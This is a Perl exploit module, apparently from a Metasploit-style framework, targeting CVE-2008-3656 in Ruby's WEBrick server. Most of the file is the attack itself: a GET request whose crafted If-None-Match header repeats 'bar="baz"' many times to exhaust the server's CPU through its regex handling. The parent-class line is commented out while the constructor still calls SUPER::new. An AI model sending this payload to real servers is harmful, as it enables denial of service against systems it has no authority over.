package MSFExploits::Exploits::WEBRICK::MSF::WebrickRegex;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::WEBRICK);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "WebrickRegex";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2008-3656",
  DESCRIPTION => "

        The WEBrick::HTTP::DefaultFileHandler in WEBrick in

        Ruby 1.8.5 and earlier, 1.8.6 to 1.8.6-p286, 1.8.7

        to 1.8.7-p71, and 1.9 to r18423 allows for a DoS

        (CPU consumption) via a crafted HTTP request.

      ",
  MSF_MODULE => "webrick_regex",
  OSVDB => 47471,
  REFERENCES => [
    "http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/",
  ],
  TITLE => "Ruby WEBrick::HTTP::DefaultFileHandler DoS",
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "URI to request", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'If-None-Match' => 'foo=""bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz" bar="baz"',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
